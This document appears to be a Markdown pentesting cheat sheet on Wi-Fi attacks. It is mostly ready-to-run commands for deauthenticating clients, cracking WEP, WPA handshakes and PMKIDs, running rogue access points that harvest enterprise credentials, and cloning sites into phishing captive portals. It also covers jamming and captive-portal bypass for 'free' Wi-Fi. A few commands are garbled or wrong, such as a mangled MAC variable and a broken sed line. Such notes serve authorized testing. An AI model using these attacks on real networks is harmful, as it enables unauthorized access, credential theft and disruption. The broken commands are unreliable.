# Wifi pentesting


## Reconaissance frameworks

- [Acrylic](https://www.acrylicwifi.com/) (Windows)
- [Airodump-ng from Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng) (Linux)


-----------------------------------------

## Basic commands

### Check status of wireless interfaces

```bash
iwconfig
```

### Set interface to monitor mode

Set environment variable:

```bash
IFACE=wlan0
```

Use iwconfig to set monitor mode:

```bash
ifconfig $IFACE down
iwconfig $IFACE mode monitor
ifconfig $IFACE up
```

### List networks

```bash
airmon-ng check kill
ifconfig $IFACE down
iwconfig $IFACE mode monitor
ifconfig $IFACE up
airmon-ng $IFACE
```

Or:

```bash
nmcli dev wifi list
```


### Deauthentication

Deauthenticate a client:

```bash
 aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC -c $CLIENT_MAC $IFACE
```

Deauthenticate all the clients in the AP:

```bash
 aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC -c $CLIENT_MAC $IFACE
```

------------------------------------------

## Get hidden SSID

1. List networks

Get the AP mac address of the router ($AP_MAC) and ideally one from a client ($CLIENT_MAC)

```bash
airmon-ng check kill
ifconfig $IFACE down
iwconfig $IFACE mode monitor
ifconfig $IFACE up
airmon-ng $IFACE
```

2. Deauthentication

In a second terminal, deauthenticate a client or all of them. When Airodump captures a handshake from this network, the name or ESSID will appear in the first terminal:

```bash
aireplay-ng -0 $NUMBER_DEAUTH_PACKETS -a $AP_MAC -c $CLIENT_MAC $IFACE
```


------------------------------------------


## WEP 

### Cracking password - No clients

1. Start capture

```bash
# Terminal window 1
airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $PCAP_FILE $IFACE
```


2. Fake authentication + Arp Request Replay Attack + Deauthenticate user -> Accelerate the IV capture. Stop airodump capture when you have around 100.000 different IVs

```bash
# Terminal window 2$AP_MAC
aireplay-ng -1 0 -e $AP_NAME -a $AP_MAC -h $MY_MAC $IFACE
aireplay-ng -3 -b $AP_MAC -h $MY_MAC $IFACE
aireplay-ng -0 1 -a $AP_MA$AP_MACC -c $STATION_MAC $IFACE
aircrack-ng $PCAP_FILE
```

3. Crack the password using Aircrack-ng

```bash
aircrack-ng $PCAP_FILE
```

------------------------------------------

## WPA-Personal

### Cracking the 4-way-handshake

1. Start capture

```bash
# Terminal window 1
airodump-ng -c $AP_CHANNEL --bssid $AP_MAC -w $PCAP_FILE $IFACE
```

2. Deauthenticate an user. Stop airodump capture when you see a message 'WPA handshake: $MAC'

```bash
# Terminal window 2
aireplay-ng -0 1 -a $AP_MAC -c $STATION_MAC $IFACE
```

3. Option 1: Crack the handshake using Aircrack-ng

```bash
aircrack-ng -w $WORDLIST capture.cap
```

4. Option 2: Crack the handshake using Pyrit

```bash
pyrit -r $PCAP_FILE analyze
pyrit -r $PCAP_FILE -o $CLEAN_PCAP_FILE strip
pyrit -i $WORDLIST import_passwords
pyrit eval
pyrit batch
pyrit -r $CLEAN_PCAP_FILE attack_db
```


### PMKID attack

1. Install the needed tools 

```bash
git clone https://github.com/ZerBea/hcxdumptool.git
cd hcxdumptool && make && make install && cd ..
git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools && make && make install
```

2. Create a text file ($FILTER_FILE) and add the MAC address without ":". You can use *sed* and redirect the output to a file:

```bash
echo aa:asd:asd | sed 's/://g' 00:1B:44:11:3A:B7 > filter_file.txt
```

3. Capture PMKID

```bash
hcxdumptool -i $IFACE -o $PCAPNG_FILE --enable__status=1 --filterlist=$FILTER_FILE --filtermode=2
```

4. Create $HASH_FILE and crack it

```bash
hcxpcaptool -z $HASH_FILE $PCAPNG_FILE

hashcat -a 0 -m 16800 $HASH_FILE $WORDLIST --force
```


### Wordlists/Dictionaries

- https://github.com/kennyn510/wpa2-wordlists


------------------------------------------

## WPA-Enterprise

### Radius brute force

- [Auto-EAP](https://github.com/Tylous/Auto_EAP)

------------------------------------------

## Fake Access Points

### Frameworks

- [Eaphammer](https://github.com/s0lst1c3/eaphammer)


### Hostapd: Creating ordinary APs

```
hostapd $CONFIGURATION_FILE.conf
```

#### Configuration files

- [802.11b/g/n with WPA2-PSK and CCMP](https://wiki.gentoo.org/wiki/Hostapd#802.11b.2Fg.2Fn_with_WPA2-PSK_and_CCMP)
- [802.11a/n/ac with WPA2-PSK and CCMP](https://wiki.gentoo.org/wiki/Hostapd#802.11a.2Fn.2Fac_with_WPA2-PSK_and_CCMP)
- [802.11b/g/n triple AP](https://wiki.gentoo.org/wiki/Hostapd#802.11b.2Fg.2Fn_triple_AP)
- [WPA3](https://github.com/vanhoefm/hostap-wpa3/blob/master/hostapd/hostapd_wpa3.conf)


### Hostapd-wpe = Hashes from the authentication process

#### My installation script

Tested in Ubuntu 16.04:

```bash
#!/sh
cd WPA2-enterprise
origin=$(pwd)
sudo apt-get install -y libssl-dev libnl-genl-3-dev git aircrack-ng libssl1.0-dev openssl
mkdir install_h
cd install_h && git clone https://github.com/OpenSecurityResearch/hostapd-wpe && wget http://hostap.epitest.fi/releases/hostapd-2.6.tar.gz && tar -xzvf hostapd-2.6.tar.gz
cd hostapd-2.6 && patch -p1 < ../hostapd-wpe/hostapd-wpe.patch
cd hostapd  && make  && sudo make install
cd ../../hostapd-wpe/certs && ./bootstrap
sudo cp install_h/hostapd-2.6/hostapd/hostapd-wpe /usr/bin/hostapd-wpe
cd $origin

```

#### Create the AP

Script:

```bash
#!/sh
sudo files/hostapd_wpe/certs/bootstrap
cp files/hostapd_wpe/hostapd-wpe.conf files/hostapd_wpe/temp.conf
sed 's/SSID_name/'$1'/g' files/hostapd_wpe/hostapd-wpe.conf > files/hostapd_wpe/temp.conf
cd files/hostapd_wpe && sudo hostapd-wpe temp.conf
```

Syntax:

```bash
sh hostapd_wpe_init.sh ap_name 
```


### Hostapd + Freeradius-wpe = Plaintext authentication

#### My installation script

Tested in Ubuntu 16.04:

```bash
#!/sh
cd WPA2-enterprise
origin=$(pwd)
sudo apt-get -y install libssl-dev libnl-genl-3-dev git aircrack-ng libssl1.0-dev hostapd libssl1.0-dev openssl
cd $origin
sudo apt-get -y install hostapd openssl
mkdir install_f
cd install_f
wget ftp://ftp.freeradius.org/pub/radius/old/freeradius-server-2.1.12.tar.bz2
wget https://raw.github.com/brad-anton/freeradius-wpe/master/freeradius-wpe.patch
tar -jxvf freeradius-server-2.1.12.tar.bz2
cd freeradius-server-2.1.12
patch -p1 < ../freeradius-wpe.patch
./configure && make && sudo make install && sudo ldconfig
sudo /usr/local/etc/raddb/certs/bootstrap
cd $origin
sudo cp files/users /usr/local/etc/raddb/
sudo cp files/clients.conf /usr/local/etc/raddb/
sudo cp files/eap.conf /usr/local/etc/raddb/
sudo chmod 640 /usr/local/etc/raddb/users
sudo chmod 640 /usr/local/etc/raddb/clients.conf
sudo chmod 640 /usr/local/etc/raddb/eap.conf
cd $origin
```


#### Create the AP

Script *freeradius_wpe_init.sh*:

```bash
#!/sh
sudo killall hostapd radiusd
sudo radiusd -X &
sudo airmon-ng check kill
cp files/ap.conf files/temp.conf
sed 's/SSID_name/'$1'/g' files/ap.conf > files/temp.conf
sudo hostapd files/temp.conf
```

Syntax:

```bash
sh freeradius_wpe_init.sh ap_name 
```

#### Read the logs

Script *freeradius_wpe_read.sh*:

```bash
#!/sh
sudo tail /usr/local/var/log/radius/freeradius-server-wpe.log
```

Syntax:

```bash
sh freeradius_wpe_read.sh ap_name 
```

-------------------------------------

## Captive portals

### Fake captive portals

[Wifiphiser](https://github.com/wifiphisher/wifiphisher) - It is possible to update the code of the examples provided and create a customized captive portal. Fot that, recompile the project (*python setup.py install*) or use the binary in *bin*. 

For example, you can clone a website using [HTTrack](https://www.httrack.com/) and add the result in a new folder in *wifiphisher/data/phishing-pages/*new_page*/html* and a configuration file in  *wifiphisher/data/phishing-pages/*new_page*/config.ini*. Check the other phishing pages examples to see how this can be done. 

This command works correctly in the latest Kali release (with hostapd installed):

```
cd bin && ./wifiphisher -aI $IFACE -e $ESSID --force-hostapd -p $PLUGIN -nE
```


### Captive portal bypass I - MAC spoofing

The first method to bypass a captive portal is to change your MAC address to one of an already authenticated user

- [Poliva script](https://raw.githubusercontent.com/poliva/random-scripts/master/wifi/hotspot-bypass.sh)

- [Anubis](https://github.com/sundaysec/anubis)

- [Wifi Pumpkin](https://github.com/P0cL4bs/WiFi-Pumpkin)

- [Hackcaptiveportals](https://github.com/systematicat/hack-captive-portals)


### Captive portal bypass II - DNS tunnelling

A second method is creating a DNS tunnel. For this, it is necessary to have an accessible DNS server of your own. You can use this method to bypass the captive portal and get "free" Wifi in hotel, airports...

- [Iodine](https://github.com/yarrick/iodine)

- A good tutorial: https://medium.com/@galolbardes/learn-how-easy-is-to-bypass-firewalls-using-dns-tunneling-and-also-how-to-block-it-3ed652f4a000


---------------------------------------------


## Other tools

### Krack Attack

- [Krack Attack Test Scripts](https://github.com/vanhoefm/krackattacks-scripts)


### OSINT

- [Wigle](https://wigle.net/)


### Jamming

- [Wifijammer](https://github.com/DanMcInerney/wifijammer) - This program can send deauthentication packets to both APs and clients. 

An example to deauthenticate all the devices except a Fake Acess Point:

```
sudo ./wifijammer -i $IFACE -s $FAKE_AP_MAC
```

---------------------------------------------

## Other frameworks
- [Ekahau](https://www.ekahau.com/) - Useful for Wi-Fi planning (Windows) 
- [Vistumbler](https://www.vistumbler.net/) - Useful for wardriving (Windows)
- [Sniffair](https://github.com/Tylous/SniffAir) (Linux)

---------------------------------------------

## Note

Feel free to contribute!
